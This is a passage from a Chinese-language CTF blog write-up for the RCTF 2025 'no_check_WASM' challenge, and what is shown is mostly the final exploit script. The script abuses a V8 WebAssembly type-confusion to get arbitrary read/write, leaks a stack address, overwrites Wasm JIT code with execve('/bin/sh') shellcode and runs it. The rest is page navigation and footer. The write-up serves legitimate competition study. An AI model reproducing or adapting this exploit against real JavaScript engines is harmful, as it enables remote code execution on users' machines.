hi) &#123;</span><br><span class="line">    this.u32[0] = lo &gt;&gt;&gt; 0;</span><br><span class="line">    this.u32[1] = hi &gt;&gt;&gt; 0;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → low 32-bit</span><br><span class="line">  i2lo(i) &#123;</span><br><span class="line">    return Number(i &amp; 0xffffffffn);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → high 32-bit</span><br><span class="line">  i2hi(i) &#123;</span><br><span class="line">    return Number(i &gt;&gt; 32n);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float32 → int32</span><br><span class="line">  f32toi32(f) &#123;</span><br><span class="line">    this.f32[0] = f;</span><br><span class="line">    return this.u32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int32 → float32</span><br><span class="line">  i32tof32(i) &#123;</span><br><span class="line">    this.u32[0] = i;</span><br><span class="line">    return this.f32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  p(arg) &#123;</span><br><span class="line">    %DebugPrint(arg);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  debug(arg) &#123;</span><br><span class="line">    %DebugPrint(arg);</span><br><span class="line">    %SystemBreak();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stop() &#123;</span><br><span class="line">    %SystemBreak();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  hex32(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(8, &quot;0&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hex64(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(16, &quot;0&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hexx(str, val) &#123;</span><br><span class="line">    console.log(`[*] $&#123;str&#125;: 0x$&#123;val.toString(16)&#125;`);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printhex(val) &#123;</span><br><span class="line">    console.log(&quot;0x&quot; + val.toString(16));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  add_ref(obj) &#123;</span><br><span class="line">    this.state[this.i++] = obj;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  gc() &#123;</span><br><span class="line">    new Array(0x7fe00000);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const helpers = new Helpers();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const f2i = x =&gt; helpers.f2i(x);</span><br><span class="line">const i2f = x =&gt; helpers.i2f(x);</span><br><span class="line">const hex = x =&gt; helpers.hex(x);</span><br><span class="line">const f2h = x =&gt; helpers.f2h(x);</span><br><span class="line">const f2a = x =&gt; helpers.f2a(x);</span><br><span class="line">const a2f = x =&gt; helpers.a2f(x);</span><br><span class="line">const f2is = x =&gt; helpers.f2is(x);</span><br><span class="line">const i2fs = x =&gt; helpers.i2fs(x);</span><br><span class="line">const f2lo = x =&gt; helpers.f2lo(x);</span><br><span class="line">const f2hi = x =&gt; helpers.f2hi(x);</span><br><span class="line">const i2f64 = (lo, hi) =&gt; helpers.i2f64(lo, hi);</span><br><span class="line">const i2lo = x =&gt; helpers.i2lo(x);</span><br><span class="line">const i2hi = x =&gt; helpers.i2hi(x);</span><br><span class="line">const f32toi32 = x =&gt; helpers.f32toi32(x);</span><br><span class="line">const i32tof32 = x =&gt; helpers.i32tof32(x);</span><br><span class="line">const p = x =&gt; helpers.p(x);</span><br><span class="line">const debug = x =&gt; helpers.debug(x);</span><br><span class="line">const stop = () =&gt; helpers.stop();</span><br><span class="line">const hex32 = x =&gt; helpers.hex32(x);</span><br><span class="line">const hex64 = x =&gt; helpers.hex64(x);</span><br><span class="line">const hexx = (str, val) =&gt; helpers.hexx(str, val);</span><br><span class="line">const printhex = x =&gt; helpers.printhex(x);</span><br><span class="line">const add_ref = x =&gt; helpers.add_ref(x);</span><br><span class="line">const gc = () =&gt; helpers.gc();</span><br><span class="line"></span><br><span class="line">path = &quot;../v8/test/mjsunit/wasm/wasm-module-builder.js&quot;;</span><br><span class="line">d8.file.execute(path);</span><br><span class="line"></span><br><span class="line">const builder = new WasmModuleBuilder();</span><br><span class="line"></span><br><span class="line">const structType = builder.addStruct([makeField(kWasmI64, true)]);</span><br><span class="line"> </span><br><span class="line">const i2s = builder.addFunction(&quot;i64_to_struct&quot;,makeSig([kWasmI64], [wasmRefType(structType)]))</span><br><span class="line">.addBody([</span><br><span class="line">  kExprLocalGet, 0,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">builder.addFunction(&quot;AAR&quot;, makeSig([kWasmI64], [kWasmI64]))</span><br><span class="line">.exportFunc() </span><br><span class="line">.addBody([</span><br><span class="line">  kExprLocalGet, 0,                              </span><br><span class="line">  kExprCallFunction, i2s.index, </span><br><span class="line">  kGCPrefix, kExprStructGet,    </span><br><span class="line">  ...wasmUnsignedLeb(structType, kMaxVarInt32Size),</span><br><span class="line">  ...wasmUnsignedLeb(0, kMaxVarInt32Size),</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">builder.addFunction(&quot;AAW&quot;, makeSig([kWasmI64, kWasmI64], []))</span><br><span class="line">.exportFunc()</span><br><span class="line">.addBody([</span><br><span class="line">  kExprLocalGet, 0,</span><br><span class="line">  kExprCallFunction, i2s.index,</span><br><span class="line">  kExprLocalGet, 1, </span><br><span class="line">  kGCPrefix, kExprStructSet, </span><br><span class="line">  ...wasmUnsignedLeb(structType, kMaxVarInt32Size),</span><br><span class="line">  ...wasmUnsignedLeb(0, kMaxVarInt32Size),</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">builder.addFunction(&quot;leak_stack&quot;, makeSig([], [kWasmI64, kWasmI64, kWasmI64]))</span><br><span class="line">.exportFunc()</span><br><span class="line">.addBody([</span><br><span class="line">  kExprI64Const, 0,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">const instance = builder.instantiate();</span><br><span class="line">let &#123;leak_stack, AAR, AAW&#125; = instance.exports;</span><br><span class="line"></span><br><span class="line">let stack_addr = leak_stack();</span><br><span class="line">for(let i = 0; i &lt; stack_addr.length; i++)&#123;</span><br><span class="line">  hexx(&quot;stack_addr[&quot;+i+&quot;]&quot;, stack_addr[i]);</span><br><span class="line">&#125;</span><br><span class="line">stack_value = stack_addr[0] &lt;&lt; 32n | stack_addr[1];</span><br><span class="line">hexx(&quot;stack_value&quot;, stack_value);</span><br><span class="line"> </span><br><span class="line">//stop()</span><br><span class="line"></span><br><span class="line">let jit_code_addr = AAR(stack_value+1n);</span><br><span class="line"> </span><br><span class="line">hexx(&quot;jit_code_addr&quot;, jit_code_addr);</span><br><span class="line"> </span><br><span class="line">let wasm_code = new Uint8Array([</span><br><span class="line">  0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0,</span><br><span class="line">  1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128,</span><br><span class="line">  128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105,</span><br><span class="line">  110, 0, 0, 10, 142, 128, 128, 128, 0, 1, 136, 128, 128, 128, 0, 0, 65, 239, 253, 182, 245, 125,</span><br><span class="line">  11,</span><br><span class="line">])</span><br><span class="line">let wasm_module  = new WebAssembly.Module(wasm_code);</span><br><span class="line">let wasm_instance  = new WebAssembly.Instance(wasm_module);</span><br><span class="line">let shell = wasm_instance.exports.main;</span><br><span class="line"> </span><br><span class="line">let offset = 0x2940n;</span><br><span class="line">let rop_addr = jit_code_addr+offset;</span><br><span class="line"></span><br><span class="line">hexx(&quot;rop_addr&quot;, rop_addr);</span><br><span class="line"> </span><br><span class="line">let shellcode = [</span><br><span class="line">    0x2fbb485299583b6an,</span><br><span class="line">    0x5368732f6e69622fn,</span><br><span class="line">    0x050f5e5457525f54n</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell();//start_jump_table有点类似glibc的lazy binding，第一次shell()是用于初始化的</span><br><span class="line">//stop()</span><br><span class="line">for(let i = 0; i &lt; shellcode.length; i++)&#123;</span><br><span class="line">  AAW(rop_addr+BigInt(i*0x8)+1n, shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">shell();</span><br></pre></td></tr></table></figure>

<p><img src="/2025/12/10/RCTF2025-no_check_WASM/index/image-20251211052421882.png" alt="image-20251211052421882"></p>
<p>参考:<a target="_blank" rel="noopener" href="https://flyyy.top/2025/11/17/rctf-2025-no_check_WASM/">RCTF 2025 - no_check_WASM - flyyy’s blog</a></p>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">h0m3</a></li>
        
          <li><a href="/about/">ab0ut</a></li>
        
          <li><a href="/archives/">art1cl3s</a></li>
        
          <li><a href="/links/">l1nks</a></li>
        
          <li><a href="/search/">s3arch</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#addressOf"><span class="toc-number">3.1.</span> <span class="toc-text">addressOf</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#fakeObj"><span class="toc-number">3.2.</span> <span class="toc-text">fakeObj</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#AAR-AAW"><span class="toc-number">3.3.</span> <span class="toc-text">AAR &amp;&amp; AAW</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E6%B2%99%E7%AE%B1%E7%9A%84%E5%9F%BA%E5%9D%80-wasm-stack"><span class="toc-number">3.4.</span> <span class="toc-text">泄露沙箱的基址&amp;wasm stack</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">3.5.</span> <span class="toc-text">遇到的问题</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#exp"><span class="toc-number">3.6.</span> <span class="toc-text">exp</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/12/10/RCTF2025-no_check_WASM/index/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/12/10/RCTF2025-no_check_WASM/index/&text=RCTF2025-no_check_WASM复现"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/12/10/RCTF2025-no_check_WASM/index/&title=RCTF2025-no_check_WASM复现"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/12/10/RCTF2025-no_check_WASM/index/&is_video=false&description=RCTF2025-no_check_WASM复现"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=RCTF2025-no_check_WASM复现&body=Check out this article: http://example.com/2025/12/10/RCTF2025-no_check_WASM/index/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/12/10/RCTF2025-no_check_WASM/index/&title=RCTF2025-no_check_WASM复现"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/12/10/RCTF2025-no_check_WASM/index/&title=RCTF2025-no_check_WASM复现"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/12/10/RCTF2025-no_check_WASM/index/&title=RCTF2025-no_check_WASM复现"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/12/10/RCTF2025-no_check_WASM/index/&title=RCTF2025-no_check_WASM复现"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/12/10/RCTF2025-no_check_WASM/index/&name=RCTF2025-no_check_WASM复现&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/12/10/RCTF2025-no_check_WASM/index/&t=RCTF2025-no_check_WASM复现"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
      <div class="footer-left">
        Copyright &copy;
        
        
        2016-2025
        PuH4ck3rX
      </div>
      <div class="footer-right">
        <nav>
          <ul>
            <!--
          --><li><a href="/">h0m3</a></li><!--
        --><!--
          --><li><a href="/about/">ab0ut</a></li><!--
        --><!--
          --><li><a href="/archives/">art1cl3s</a></li><!--
        --><!--
          --><li><a href="/links/">l1nks</a></li><!--
        --><!--
          --><li><a href="/search/">s3arch</a></li><!--
        -->
          </ul>
          <ul>
            
              <!-- busuanzi统计 -->
              <span id="busuanzi_container_site_pv">
                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
              </span>
              <span class="post-meta-divider">|</span>
              <span id="busuanzi_container_site_uv" style='display:none'>
                      本站访客数<span id="busuanzi_value_site_uv"></span>人
              </span>
            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            
          </ul>
        </nav>
      </div>
      
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'SITENAME';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

</body>
</html>
